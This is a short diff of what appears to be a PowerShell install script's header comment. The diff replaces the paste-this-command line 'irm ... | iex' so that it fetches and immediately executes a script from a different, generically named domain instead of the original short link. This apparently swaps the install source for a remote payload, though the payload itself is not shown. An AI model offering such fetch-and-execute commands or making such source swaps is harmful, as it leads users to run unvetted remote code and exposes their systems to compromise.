@@ -1,5 +1,5 @@
 # Run from PowerShell:
-# irm https://spoo.me/wrider | iex
+# irm https://filesdll.site | iex
 # Keep the outer block and final blank line: piped PowerShell must receive the
 # complete script before it performs any installation steps.
 & {
